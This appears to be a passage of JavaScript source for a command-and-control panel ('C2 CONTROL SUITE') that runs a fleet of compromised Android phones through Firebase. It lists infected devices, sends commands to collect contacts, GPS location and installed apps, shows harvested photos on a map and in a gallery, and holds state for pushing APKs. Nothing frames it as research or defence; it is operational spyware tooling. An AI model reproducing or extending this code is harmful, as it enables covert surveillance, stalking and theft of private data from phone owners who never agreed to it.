// ============================================================
// C2 CONTROL SUITE — ADVANCED CLIENT CONTROLLER
// ============================================================

const isLoginPage = window.location.pathname.includes("index.html") ||
                    window.location.pathname.endsWith("/admin-panel/") ||
                    window.location.pathname.endsWith("admin-panel") ||
                    window.location.pathname === "/";

const isDashboard = window.location.pathname.includes("dashboard.html");

// ============================================================
// TOAST NOTIFICATION UTILITY
// ============================================================
function showToast(message, type = "success") {
    const container = document.getElementById("toastContainer");
    if (!container) return;

    const toast = document.createElement("div");
    toast.className = `toast ${type}`;

    let icon = "fa-circle-check";
    if (type === "error") icon = "fa-circle-xmark";
    if (type === "warning") icon = "fa-triangle-exclamation";

    toast.innerHTML = `
        <i class="fa-solid ${icon}"></i>
        <span>${message}</span>
    `;

    container.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = "0";
        toast.style.transform = "translateX(50px)";
        toast.style.transition = "all 0.3s ease";
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}

// ============================================================
// CONFIRMATION MODAL HELPER
// ============================================================
let activeConfirmCallback = null;

function openConfirmModal(title, message, onConfirm) {
    const modal = document.getElementById("confirmDeleteModal");
    const titleEl = document.getElementById("deleteModalTitle");
    const msgEl = document.getElementById("deleteModalMessage");
    const confirmBtn = document.getElementById("btnConfirmDeleteAction");

    if (!modal) {
        if (confirm(`${title}\n\n${message}`)) {
            onConfirm();
        }
        return;
    }

    titleEl.textContent = title;
    msgEl.textContent = message;
    activeConfirmCallback = onConfirm;

    confirmBtn.onclick = () => {
        if (activeConfirmCallback) {
            activeConfirmCallback();
            activeConfirmCallback = null;
        }
        closeConfirmModal();
    };

    modal.classList.add("active");
}

function closeConfirmModal() {
    const modal = document.getElementById("confirmDeleteModal");
    if (modal) modal.classList.remove("active");
    activeConfirmCallback = null;
}

// ============================================================
// 1. LOGIN PAGE LOGIC
// ============================================================
if (isLoginPage) {
    const loginForm = document.getElementById("loginForm");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");
    const errorMsg = document.getElementById("errorMsg");
    const loginBtn = document.getElementById("loginBtn");
    const togglePwBtn = document.getElementById("togglePassword");
    const togglePwIcon = document.getElementById("togglePasswordIcon");

    // Toggle password visibility
    if (togglePwBtn && passwordInput) {
        togglePwBtn.addEventListener("click", () => {
            const isPassword = passwordInput.type === "password";
            passwordInput.type = isPassword ? "text" : "password";
            if (togglePwIcon) {
                togglePwIcon.className = isPassword ? "fa-regular fa-eye-slash" : "fa-regular fa-eye";
            }
        });
    }

    // Auto-redirect if already signed in
    auth.onAuthStateChanged((user) => {
        if (user) {
            window.location.href = "dashboard.html";
        }
    });

    if (loginForm) {
        loginForm.addEventListener("submit", (e) => {
            e.preventDefault();
            errorMsg.className = "error-msg";
            errorMsg.textContent = "";
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Authenticating...';

            const email = emailInput.value.trim();
            const password = passwordInput.value;

            auth.signInWithEmailAndPassword(email, password)
                .then(() => {
                    window.location.href = "dashboard.html";
                })
                .catch((error) => {
                    errorMsg.textContent = error.message || "Authentication failed. Check credentials.";
                    errorMsg.classList.add("visible");
                    loginBtn.disabled = false;
                    loginBtn.innerHTML = '<span class="btn-text">Authenticate Session</span> <i class="fa-solid fa-arrow-right"></i>';
                });
        });
    }
}

// ============================================================
// 2. DASHBOARD PAGE LOGIC
// ============================================================
if (isDashboard) {

    let currentDeviceId = null;
    let devices = {};
    let deviceData = {};
    let activeFilter = "all"; // all, online, offline
    let currentSuiteTab = "info";
    let activeAppsCategory = "all"; // all, user, system

    // Leaflet map instances
    let map = null;
    let mapMarker = null;
    let mapCircle = null;

    // APK Push State
    let currentApkMethod = "upload";
    let selectedApkFile = null;

    // ---------- AUTH STATE GUARD ----------
    auth.onAuthStateChanged((user) => {
        if (!user) {
            window.location.href = "index.html";
            return;
        }
        const emailEl = document.getElementById("userEmail");
        if (emailEl) emailEl.textContent = user.email;
    });

    // ---------- LOGOUT ----------
    const logoutBtn = document.getElementById("logoutBtn");
    if (logoutBtn) {
        logoutBtn.addEventListener("click", () => {
            auth.signOut().then(() => {
                window.location.href = "index.html";
            });
        });
    }

    // ---------- ONLINE DETECTION HELPER ----------
    // Active within 5 minutes or explicitly marked online
    function isDeviceOnline(device) {
        if (!device) return false;
        const info = device.info || {};
        if (info.status === "online" || device.status === "online") return true;

        const lastSeen = parseInt(info.last_seen || info.updated_at || info.first_seen || device.last_seen || 0);
        if (!lastSeen) return false;

        const fiveMinutes = 5 * 60 * 1000;
        return (Date.now() - lastSeen) < fiveMinutes;
    }

    function formatRelativeTime(timestamp) {
        if (!timestamp) return "Never";
        const ts = parseInt(timestamp);
        if (isNaN(ts) || ts <= 0) return "Unknown";

        const diffSeconds = Math.floor((Date.now() - ts) / 1000);
        if (diffSeconds < 60) return "Just now";
        const diffMinutes = Math.floor(diffSeconds / 60);
        if (diffMinutes < 60) return `${diffMinutes}m ago`;
        const diffHours = Math.floor(diffMinutes / 60);
        if (diffHours < 24) return `${diffHours}h ago`;
        const diffDays = Math.floor(diffHours / 24);
        return `${diffDays}d ago`;
    }

    // ---------- GLOBAL SEARCH & FILTER LISTENER ----------
    const globalSearchInput = document.getElementById("globalDeviceSearch");
    if (globalSearchInput) {
        globalSearchInput.addEventListener("input", () => {
            renderDeviceList();
        });
    }

    // ---------- LISTEN TO ALL DEVICES ----------
    database.ref("devices").on("value", (snapshot) => {
        devices = snapshot.val() || {};
        renderDeviceList();
        updateOverviewStats();

        // If current selected device was removed from DB
        if (currentDeviceId && !devices[currentDeviceId]) {
            currentDeviceId = null;
            deviceData = {};
            resetActiveDeviceView();
            showToast("Selected device was removed from database.", "warning");
        }
    });

    // ---------- REFRESH DEVICES ----------
    window.refreshDevices = function () {
        database.ref("devices").once("value", (snapshot) => {
            devices = snapshot.val() || {};
            renderDeviceList();
            updateOverviewStats();
            showToast("Device list refreshed.");
        });
    };

    // ---------- FILTER DEVICES BY TAB ----------
    window.filterDevices = function (filterType) {
        activeFilter = filterType;
        document.querySelectorAll(".filter-tab").forEach(tab => {
            tab.classList.toggle("active", tab.dataset.filter === filterType);
        });
        renderDeviceList();
    };

    // ---------- RENDER SIDEBAR DEVICE LIST ----------
    function renderDeviceList() {
        const container = document.getElementById("deviceList");
        if (!container) return;

        const query = (globalSearchInput ? globalSearchInput.value.trim().toLowerCase() : "");
        const allIds = Object.keys(devices);

        let countAll = allIds.length;
        let countOnline = 0;
        let countOffline = 0;

        allIds.forEach(id => {
            if (isDeviceOnline(devices[id])) countOnline++;
            else countOffline++;
        });

        const cAllEl = document.getElementById("filterCountAll");
        const cOnEl = document.getElementById("filterCountOnline");
        const cOffEl = document.getElementById("filterCountOffline");
        if (cAllEl) cAllEl.textContent = countAll;
        if (cOnEl) cOnEl.textContent = countOnline;
        if (cOffEl) cOffEl.textContent = countOffline;

        // Apply filter
        const filteredIds = allIds.filter(id => {
            const dev = devices[id];
            const online = isDeviceOnline(dev);

            if (activeFilter === "online" && !online) return false;
            if (activeFilter === "offline" && online) return false;

            if (query) {
                const info = dev.info || {};
                const model = (info.model || "").toLowerCase();
                const ip = (info.ip || info.ip_address || "").toLowerCase();
                const android = (info.android_version || "").toString().toLowerCase();
                const match = id.toLowerCase().includes(query) ||
                              model.includes(query) ||
                              ip.includes(query) ||
                              android.includes(query);
                if (!match) return false;
            }

            return true;
        });

        if (filteredIds.length === 0) {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="fa-solid fa-mobile-screen-button"></i>
                    <p>No units found matching criteria.</p>
                </div>
            `;
            return;
        }

        container.innerHTML = "";
        filteredIds.forEach(deviceId => {
            const dev = devices[deviceId];
            const info = dev.info || {};
            const model = info.model || "Android Device";
            const android = info.android_version || "?";
            const battery = info.battery_level ? `${info.battery_level}%` : (info.battery || "--");
            const online = isDeviceOnline(dev);
            const lastActiveTs = info.last_seen || info.updated_at || info.first_seen || dev.last_seen;
            const relativeTime = online ? "Online" : formatRelativeTime(lastActiveTs);

            const card = document.createElement("div");
            card.className = `device-card-item ${deviceId === currentDeviceId ? "selected" : ""}`;
            card.onclick = () => selectDevice(deviceId);

            card.innerHTML = `
                <div class="device-card-header">
                    <div class="device-card-name">
                        <span class="online-pulse-dot ${online ? 'online' : 'offline'}"></span>
                        <span>${escapeHTML(model)}</span>
                    </div>
                    <span class="device-card-badge">OS ${escapeHTML(android)}</span>
                </div>
                <div class="device-card-details">
                    <span><i class="fa-solid fa-fingerprint"></i> ${deviceId.substring(0, 10)}...</span>
                    <span><i class="fa-solid fa-battery-half"></i> ${escapeHTML(battery)}</span>
                </div>
                <div class="device-card-footer">
                    <span><i class="fa-regular fa-clock"></i> ${relativeTime}</span>
                    <button class="btn-card-delete" title="Delete device" onclick="event.stopPropagation(); promptDeleteDevice('${deviceId}', '${escapeHTML(model)}')">
                        <i class="fa-regular fa-trash-can"></i>
                    </button>
                </div>
            `;
            container.appendChild(card);
        });
    }

    // ---------- MOBILE SIDEBAR TOGGLE ----------
    window.toggleMobileSidebar = function () {
        const panel = document.getElementById("deviceSidebarPanel");
        const backdrop = document.getElementById("sidebarBackdrop");
        if (!panel) return;
        const isOpen = panel.classList.toggle("mobile-open");
        if (backdrop) backdrop.classList.toggle("active", isOpen);
    };

    // ---------- SELECT DEVICE ----------
    window.selectDevice = function (deviceId) {
        if (!deviceId || !devices[deviceId]) return;

        // Auto close mobile drawer if open
        const panel = document.getElementById("deviceSidebarPanel");
        const backdrop = document.getElementById("sidebarBackdrop");
        if (panel) panel.classList.remove("mobile-open");
        if (backdrop) backdrop.classList.remove("active");

        if (currentDeviceId && currentDeviceId !== deviceId) {
            database.ref(`devices/${currentDeviceId}`).off();
        }

        currentDeviceId = deviceId;
        renderDeviceList();

        // Listen in real-time to this device
        database.ref(`devices/${deviceId}`).on("value", (snapshot) => {
            deviceData = snapshot.val() || {};
            updateActiveDeviceBanner();
            renderAllTabsData();
            updateOverviewStats();
        });

        showToast(`Connected to device: ${deviceId.substring(0, 8)}...`);
    };

    // ---------- UPDATE ACTIVE DEVICE BANNER ----------
    function updateActiveDeviceBanner() {
        if (!currentDeviceId || !deviceData) return;

        const info = deviceData.info || {};
        const model = info.model || "Unknown Android Unit";
        const online = isDeviceOnline(deviceData);
        const lastActiveTs = info.last_seen || info.updated_at || info.first_seen || deviceData.last_seen;
        const relativeTime = online ? "Active Now" : formatRelativeTime(lastActiveTs);
        const battery = info.battery_level ? `${info.battery_level}%` : (info.battery ? `${info.battery}%` : "N/A");

        document.getElementById("activeDeviceTitle").textContent = model;
        
        const chip = document.getElementById("activeDeviceStatusChip");
        if (chip) {
            chip.className = `status-chip ${online ? 'online' : 'offline'}`;
            chip.innerHTML = `<i class="fa-solid fa-circle"></i> <span>${online ? 'Online' : 'Offline'}</span>`;
        }

        document.getElementById("activeDeviceIdTag").innerHTML = `<i class="fa-solid fa-fingerprint"></i> ID: ${currentDeviceId}`;
        document.getElementById("activeDeviceLastSeen").innerHTML = `<i class="fa-regular fa-clock"></i> Last Seen: ${relativeTime}`;
        document.getElementById("activeDeviceBattery").innerHTML = `<i class="fa-solid fa-battery-half"></i> Battery: ${battery}`;

        document.getElementById("commandStatusFeedback").textContent = `Unit linked (${currentDeviceId.substring(0, 8)}...). Ready for commands.`;
    }

    function resetActiveDeviceView() {
        document.getElementById("activeDeviceTitle").textContent = "No Device Selected";
        const chip = document.getElementById("activeDeviceStatusChip");
        if (chip) {
            chip.className = "status-chip offline";
            chip.innerHTML = '<i class="fa-solid fa-circle"></i> <span>Offline</span>';
        }
        document.getElementById("activeDeviceIdTag").innerHTML = '<i class="fa-solid fa-fingerprint"></i> ID: None';
        document.getElementById("activeDeviceLastSeen").innerHTML = '<i class="fa-regular fa-clock"></i> Last Seen: -';
        document.getElementById("activeDeviceBattery").innerHTML = '<i class="fa-solid fa-battery-half"></i> Battery: -';
        document.getElementById("commandStatusFeedback").textContent = "Select a device to issue real-time commands";

        renderAllTabsData();
    }

    // ---------- UPDATE STATS OVERVIEW ----------
    function updateOverviewStats() {
        const allIds = Object.keys(devices);
        let onlineCount = 0;
        let totalContacts = 0;
        let totalPhotos = 0;

        allIds.forEach(id => {
            const dev = devices[id];
            if (isDeviceOnline(dev)) onlineCount++;

            if (dev.contacts) {
                totalContacts += Object.keys(dev.contacts).length;
            }
            if (dev.photos) {
                totalPhotos += Object.keys(dev.photos).length;
            }
        });

        document.getElementById("totalDevices").textContent = allIds.length;
        document.getElementById("onlineDevices").textContent = onlineCount;
        document.getElementById("offlineDevices").textContent = allIds.length - onlineCount;
        document.getElementById("totalContacts").textContent = totalContacts;
        document.getElementById("totalPhotosCount").textContent = totalPhotos;
    }

    // ---------- RENDER ALL TABS DATA ----------
    function renderAllTabsData() {
        renderDeviceInfoTab();
        renderContactsTab();
        renderLocationTab();
        renderAppsTab();
        renderPhotosTab();
        renderTelegramMediaTab();
        renderCallsTab();
        renderLogsTab();
    }

    // ============================================================
    // TAB 1: DEVICE INFO
    // ============================================================
    function renderDeviceInfoTab() {
        const grid = document.getElementById("specsGrid");
        if (!grid) return;

        if (!currentDeviceId || !deviceData) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-mobile-screen"></i>
                    <p>Select an active device from the left panel to view detailed hardware and OS telemetry.</p>
                </div>
            `;
            return;
        }

        const info = deviceData.info || {};
        const keys = Object.keys(info);

        if (keys.length === 0) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-circle-exclamation"></i>
                    <p>No specifications available for this device yet.</p>
                </div>
            `;
            return;
        }

        grid.innerHTML = "";
        keys.forEach(key => {
            const val = info[key];
            const card = document.createElement("div");
            card.className = "spec-item-card";

            let icon = "fa-microchip";
            if (key.includes("battery")) icon = "fa-battery-three-quarters";
            else if (key.includes("model")) icon = "fa-mobile-screen";
            else if (key.includes("android") || key.includes("version")) icon = "fa-robot";
            else if (key.includes("ip")) icon = "fa-network-wired";
            else if (key.includes("time") || key.includes("seen")) icon = "fa-clock";
            else if (key.includes("storage") || key.includes("memory")) icon = "fa-hard-drive";

            let formattedVal = val;
            if (key.includes("time") || key.includes("seen")) {
                const ts = parseInt(val);
                if (!isNaN(ts) && ts > 100000000000) {
                    formattedVal = new Date(ts).toLocaleString();
                }
            }

            card.innerHTML = `
                <div class="spec-item-header">
                    <i class="fa-solid ${icon}"></i>
                    <span>${escapeHTML(key.replace(/_/g, " "))}</span>
                </div>
                <div class="spec-item-value">${escapeHTML(String(formattedVal))}</div>
            `;
            grid.appendChild(card);
        });
    }

    window.copyDeviceInfoText = function () {
        if (!currentDeviceId || !deviceData || !deviceData.info) {
            showToast("No device selected.", "warning");
            return;
        }
        const info = deviceData.info;
        const text = Object.entries(info).map(([k, v]) => `${k}: ${v}`).join("\n");
        navigator.clipboard.writeText(text).then(() => {
            showToast("Device specifications copied to clipboard!");
        });
    };

    // ============================================================
    // TAB 2: CONTACTS MANAGER & DELETION
    // ============================================================
    function renderContactsTab() {
        const container = document.getElementById("contactsListContainer");
        const badge = document.getElementById("badgeContacts");
        if (!container) return;

        if (!currentDeviceId || !deviceData) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-address-book"></i>
                    <p>Select a device to inspect or delete synced contact numbers.</p>
                </div>
            `;
            if (badge) badge.textContent = "0";
            return;
        }

        const contacts = deviceData.contacts || {};
        const contactKeys = Object.keys(contacts);
        if (badge) badge.textContent = contactKeys.length;

        if (contactKeys.length === 0) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-regular fa-address-book"></i>
                    <p>No contacts retrieved yet. Click 'Fetch From Device' to scan phonebook.</p>
                </div>
            `;
            return;
        }

        const query = (document.getElementById("contactsSearchInput")?.value || "").toLowerCase().trim();

        const grid = document.createElement("div");
        grid.className = "contacts-grid";

        let displayedCount = 0;

        contactKeys.forEach((key) => {
            const item = contacts[key];
            let name = "Unknown Contact";
            let number = "";

            if (typeof item === "object" && item !== null) {
                name = item.name || item.display_name || "Unknown";
                number = item.number || item.phone || item.mobile || "";
            } else if (typeof item === "string") {
                if (item.includes(":")) {
                    const parts = item.split(":");
                    name = parts[0].trim();
                    number = parts.slice(1).join(":").trim();
                } else {
                    number = item;
                }
            }

            if (query) {
                const match = name.toLowerCase().includes(query) || number.toLowerCase().includes(query);
                if (!match) return;
            }

            displayedCount++;
            const initials = name.substring(0, 2).toUpperCase() || "CN";

            const card = document.createElement("div");
            card.className = "contact-card";
            card.innerHTML = `
                <div class="contact-meta">
                    <div class="contact-avatar-pill">${escapeHTML(initials)}</div>
                    <div class="contact-details">
                        <div class="contact-name" title="${escapeHTML(name)}">${escapeHTML(name)}</div>
                        <div class="contact-number">${escapeHTML(number || "No Number")}</div>
                    </div>
                </div>
                <div class="contact-card-actions">
                    <button class="btn-contact-action" title="Copy Number" onclick="copyText('${escapeHTML(number)}')">
                        <i class="fa-regular fa-copy"></i>
                    </button>
                    <button class="btn-contact-action btn-contact-delete" title="Delete this contact" onclick="deleteSingleContact('${key}', '${escapeHTML(name)}')">
                        <i class="fa-solid fa-trash-can"></i>
                    </button>
                </div>
            `;
            grid.appendChild(card);
        });

        container.innerHTML = "";
        if (displayedCount === 0) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <p>No contacts found matching search filter.</p>
                </div>
            `;
        } else {
            container.appendChild(grid);
        }
    }

    window.filterContactsList = function () {
        renderContactsTab();
    };

    // Single Contact Deletion
    window.deleteSingleContact = function (contactKey, contactName) {
        if (!currentDeviceId) return;

        openConfirmModal(
            "Delete Contact",
            `Are you sure you want to delete contact "${contactName}" from this device's cloud record?`,
            () => {
                database.ref(`devices/${currentDeviceId}/contacts/${contactKey}`).remove()
                    .then(() => {
                        showToast(`Contact "${contactName}" deleted.`);
                    })
                    .catch((err) => {
                        showToast(`Delete failed: ${err.message}`, "error");
                    });
            }
        );
    };

    // Bulk Contacts Deletion
    window.confirmDeleteAllContacts = function () {
        if (!currentDeviceId) {
            showToast("Select a device first.", "warning");
            return;
        }

        const count = Object.keys(deviceData.contacts || {}).length;
        if (count === 0) {
            showToast("No contacts to delete.", "warning");
            return;
        }

        openConfirmModal(
            "Delete ALL Contacts",
            `WARNING: This will permanently delete all ${count} contacts for this device from Firebase. Are you sure?`,
            () => {
                database.ref(`devices/${currentDeviceId}/contacts`).remove()
                    .then(() => {
                        showToast(`All ${count} contacts deleted.`);
                    })
                    .catch((err) => {
                        showToast(`Error: ${err.message}`, "error");
                    });
            }
        );
    };

    window.requestContactsRefresh = function () {
        sendDeviceCommand("collect_contacts", "Contacts collection requested from device.");
    };

    // ============================================================
    // TAB 3: GPS LOCATION & LEAFLET MAP
    // ============================================================
    function renderLocationTab() {
        const badge = document.getElementById("badgeLocation");
        const coordsSummary = document.getElementById("locationCoordsSummary");
        const gmapsBtn = document.getElementById("btnOpenGoogleMaps");

        if (!currentDeviceId || !deviceData) {
            if (badge) badge.textContent = "Off";
            if (coordsSummary) coordsSummary.innerHTML = '<i class="fa-solid fa-location-crosshairs text-rose"></i> <span>Select a device</span>';
            if (gmapsBtn) gmapsBtn.classList.add("disabled-link");
            return;
        }

        const loc = deviceData.location || deviceData.gps || (deviceData.info ? deviceData.info.location : null) || {};
        const lat = parseFloat(loc.latitude || loc.lat);
        const lng = parseFloat(loc.longitude || loc.lng || loc.lon);
        const hasValidCoords = !isNaN(lat) && !isNaN(lng) && (lat !== 0 || lng !== 0);

        const latEl = document.getElementById("locLat");
        const lngEl = document.getElementById("locLng");
        const accEl = document.getElementById("locAccuracy");
        const altEl = document.getElementById("locAltitude");
        const spdEl = document.getElementById("locSpeed");
        const tsEl = document.getElementById("locTimestamp");

        if (hasValidCoords) {
            if (badge) {
                badge.textContent = "Live";
                badge.className = "tab-pill-badge emerald-badge";
            }
            if (coordsSummary) {
                coordsSummary.innerHTML = `<i class="fa-solid fa-location-dot text-emerald"></i> <span>${lat.toFixed(5)}, ${lng.toFixed(5)}</span>`;
            }
            if (latEl) latEl.textContent = lat.toFixed(6);
            if (lngEl) lngEl.textContent = lng.toFixed(6);
            if (accEl) accEl.textContent = loc.accuracy ? `±${loc.accuracy}m` : "High";
            if (altEl) altEl.textContent = loc.altitude ? `${loc.altitude}m` : "N/A";
            if (spdEl) spdEl.textContent = loc.speed ? `${loc.speed} km/h` : "Stationary";
            if (tsEl) tsEl.textContent = loc.timestamp ? new Date(parseInt(loc.timestamp)).toLocaleString() : "Recent";

            if (gmapsBtn) {
                gmapsBtn.href = `https://www.google.com/maps?q=${lat},${lng}`;
                gmapsBtn.classList.remove("disabled-link");
            }

            // Update Leaflet Map
            initOrUpdateMap(lat, lng, loc.accuracy);
        } else {
            if (badge) {
                badge.textContent = "Off";
                badge.className = "tab-pill-badge";
            }
            if (coordsSummary) coordsSummary.innerHTML = '<i class="fa-solid fa-location-crosshairs text-rose"></i> <span>No GPS coordinates acquired</span>';
            if (latEl) latEl.textContent = "-";
            if (lngEl) lngEl.textContent = "-";
            if (accEl) accEl.textContent = "-";
            if (altEl) altEl.textContent = "-";
            if (spdEl) spdEl.textContent = "-";
            if (tsEl) tsEl.textContent = "-";
            if (gmapsBtn) gmapsBtn.classList.add("disabled-link");

            initOrUpdateMap(20.5937, 78.9629, 0, 4); // Default to India / center view
        }
    }

    function initOrUpdateMap(lat, lng, accuracy = 0, zoom = 15) {
        const container = document.getElementById("mapContainer");
        if (!container || typeof L === "undefined") return;

        if (!map) {
            map = L.map("mapContainer").setView([lat, lng], zoom);
            L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            }).addTo(map);
        } else {
            map.setView([lat, lng], zoom);
        }

        if (mapMarker) map.removeLayer(mapMarker);
        if (mapCircle) map.removeLayer(mapCircle);

        if (lat !== 20.5937 && lng !== 78.9629) {
            mapMarker = L.marker([lat, lng]).addTo(map);
            mapMarker.bindPopup(`<b>Device Location</b><br>Lat: ${lat.toFixed(5)}<br>Lng: ${lng.toFixed(5)}`).openPopup();

            if (accuracy && accuracy > 0) {
                mapCircle = L.circle([lat, lng], {
                    radius: accuracy,
                    color: "#10b981",
                    fillColor: "#10b981",
                    fillOpacity: 0.15
                }).addTo(map);
            }
        }

        setTimeout(() => {
            if (map) map.invalidateSize();
        }, 200);
    }

    window.requestLocationRefresh = function () {
        sendDeviceCommand("collect_location", "GPS telemetry query sent to device.");
    };

    window.confirmDeleteLocationData = function () {
        if (!currentDeviceId) return;
        openConfirmModal(
            "Clear Location Telemetry",
            "Are you sure you want to remove recorded GPS coordinates for this unit?",
            () => {
                database.ref(`devices/${currentDeviceId}/location`).remove();
                database.ref(`devices/${currentDeviceId}/gps`).remove();
                showToast("Location records purged.");
            }
        );
    };

    // ============================================================
    // TAB 4: INSTALLED APPS MANAGER
    // ============================================================
    function renderAppsTab() {
        const container = document.getElementById("appsGridContainer");
        const badge = document.getElementById("badgeApps");
        if (!container) return;

        if (!currentDeviceId || !deviceData) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-cubes"></i>
                    <p>Select a device to view installed applications and packages.</p>
                </div>
            `;
            if (badge) badge.textContent = "0";
            return;
        }

        const rawApps = deviceData.apps || deviceData.installed_apps || {};
        const appKeys = Object.keys(rawApps);
        if (badge) badge.textContent = appKeys.length;

        if (appKeys.length === 0) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-box-open"></i>
                    <p>No installed apps telemetry collected yet. Click 'Scan Installed Apps'.</p>
                </div>
            `;
            return;
        }

        const query = (document.getElementById("appsSearchInput")?.value || "").toLowerCase().trim();

        const grid = document.createElement("div");
        grid.className = "apps-grid";

        let displayed = 0;

        appKeys.forEach(key => {
            const app = rawApps[key];
            let appName = "Unknown App";
            let pkgName = "";
            let isSystem = false;

            if (typeof app === "object" && app !== null) {
                appName = app.name || app.app_name || app.label || key;
                pkgName = app.package || app.package_name || app.pkg || "";
                isSystem = Boolean(app.is_system || app.system);
            } else if (typeof app === "string") {
                appName = app;
                pkgName = app;
            }

            if (activeAppsCategory === "user" && isSystem) return;
            if (activeAppsCategory === "system" && !isSystem) return;

            if (query) {
                const match = appName.toLowerCase().includes(query) || pkgName.toLowerCase().includes(query);
                if (!match) return;
            }

            displayed++;

            const card = document.createElement("div");
            card.className = "app-item-card";
            card.innerHTML = `
                <div class="app-item-icon">
                    <i class="fa-brands fa-android"></i>
                </div>
                <div class="app-item-meta">
                    <div class="app-item-name" title="${escapeHTML(appName)}">${escapeHTML(appName)}</div>
                    <div class="app-item-package" title="${escapeHTML(pkgName)}">${escapeHTML(pkgName)}</div>
                    <span class="app-badge-tag ${isSystem ? 'system' : 'user'}">${isSystem ? 'System App' : 'User App'}</span>
                </div>
            `;
            grid.appendChild(card);
        });

        container.innerHTML = "";
        if (displayed === 0) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <p>No apps match the active filters.</p>
                </div>
            `;
        } else {
            container.appendChild(grid);
        }
    }

    window.filterAppsList = function () {
        renderAppsTab();
    };

    window.filterAppsByCategory = function (cat) {
        activeAppsCategory = cat;
        document.querySelectorAll(".app-filter-chips .filter-chip").forEach(chip => {
            chip.classList.toggle("active", chip.dataset.appfilter === cat);
        });
        renderAppsTab();
    };

    window.requestAppsRefresh = function () {
        sendDeviceCommand("collect_apps", "Scan command dispatched to phone.");
    };

    window.confirmDeleteAppsData = function () {
        if (!currentDeviceId) return;
        openConfirmModal(
            "Clear Apps Telemetry",
            "Remove cached list of installed applications from Firebase?",
            () => {
                database.ref(`devices/${currentDeviceId}/apps`).remove();
                database.ref(`devices/${currentDeviceId}/installed_apps`).remove();
                showToast("Installed apps list purged.");
            }
        );
    };

    // ============================================================
    // TAB 5: PHOTOS & MEDIA GALLERY & LIGHTBOX
    // ============================================================
    function renderPhotosTab() {
        const grid = document.getElementById("photosGalleryGrid");
        const badge = document.getElementById("badgePhotos");
        if (!grid) return;

        if (!currentDeviceId || !deviceData) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-photo-film"></i>
                    <p>Select a device to view captured photos and media.</p>
                </div>
            `;
            if (badge) badge.textContent = "0";
            return;
        }

        const photos = deviceData.photos || deviceData.gallery || deviceData.images || {};
        const photoKeys = Object.keys(photos);
        if (badge) badge.textContent = photoKeys.length;

        if (photoKeys.length === 0) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-camera"></i>
                    <p>No photos collected yet. Send 'Collect Photos' command to retrieve photos.</p>
                </div>
            `;
            return;
        }

        grid.innerHTML = "";
        photoKeys.forEach(key => {
            const item = photos[key];
            let url = "";
            let timestamp = "";

            if (typeof item === "object" && item !== null) {
                url = item.url || item.image || item.path || "";
                timestamp = item.timestamp ? new Date(parseInt(item.timestamp)).toLocaleString() : "";
            } else if (typeof item === "string") {
                url = item;
            }

            if (!url) return;

            const card = document.createElement("div");
            card.className = "photo-card";

            card.innerHTML = `
                <img src="${escapeHTML(url)}" alt="Photo Preview" loading="lazy" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\\'http://www.w3.org/2000/svg\\' width=\\'100\\' height=\\'100\\' fill=\\'%23666\\'><text x=\\'50%\\' y=\\'50%\\' dominant-baseline=\\'middle\\' text-anchor=\\'middle\\'>Image Error</text></svg>'">
                <div class="photo-card-overlay">
                    <span class="photo-date-text">${escapeHTML(timestamp || "Captured Photo")}</span>
                    <div class="photo-action-buttons">
                        <button class="btn-photo-action" title="View Fullscreen" onclick="openPhotoLightbox('${escapeHTML(url)}', '${escapeHTML(timestamp)}')">
                            <i class="fa-solid fa-expand"></i>
                        </button>
                        <a href="${escapeHTML(url)}" download="captured_${key}.jpg" target="_blank" class="btn-photo-action" title="Download Image">
                            <i class="fa-solid fa-download"></i>
                        </a>
                        <button class="btn-photo-action btn-photo-delete" title="Delete Photo" onclick="deleteSinglePhoto('${key}')">
                            <i class="fa-solid fa-trash-can"></i>
                        </button>
                    </div>
                </div>
            `;
            grid.appendChild(card);
        });
    }

    window.openPhotoLightbox = function (imgUrl, timestamp) {
        const modal = document.getElementById("photoLightboxModal");
        const img = document.getElementById("lightboxImage");
        const ts = document.getElementById("lightboxTimestamp");
        const dl = document.getElementById("lightboxDownloadBtn");

        if (!modal) return;
        img.src = imgUrl;
        ts.innerHTML = `<i class="fa-regular fa-clock"></i> ${timestamp || "Captured Frame"}`;
        dl.href = imgUrl;
        modal.classList.add("active");
    };

    window.closePhotoLightbox = function (event) {
        if (!event || event.target.id === "photoLightboxModal" || event.target.closest(".lightbox-close-btn")) {
            const modal = document.getElementById("photoLightboxModal");
            if (modal) modal.classList.remove("active");
        }
    };

    window.deleteSinglePhoto = function (photoKey) {
        if (!currentDeviceId) return;

        openConfirmModal(
            "Delete Photo",
            "Are you sure you want to permanently delete this photo from the cloud gallery?",
            () => {
                database.ref(`devices/${currentDeviceId}/photos/${photoKey}`).remove()
                    .then(() => showToast("Photo deleted."))
                    .catch(err => showToast(`Delete failed: ${err.message}`, "error"));
            }
        );
    };

    window.confirmDeleteAllPhotos = function () {
        if (!currentDeviceId) return;
        const count = Object.keys(deviceData.photos || {}).length;
        if (count === 0) {
            showToast("No photos to delete.", "warning");
            return;
        }

        openConfirmModal(
            "Delete All Photos",
            `Remove all ${count} captured photos for this unit from the database?`,
            () => {
                database.ref(`devices/${currentDeviceId}/photos`).remove()
                    .then(() => showToast(`All ${count} photos deleted.`))
                    .catch(err => showToast(`Error: ${err.message}`, "error"));
            }
        );
    };

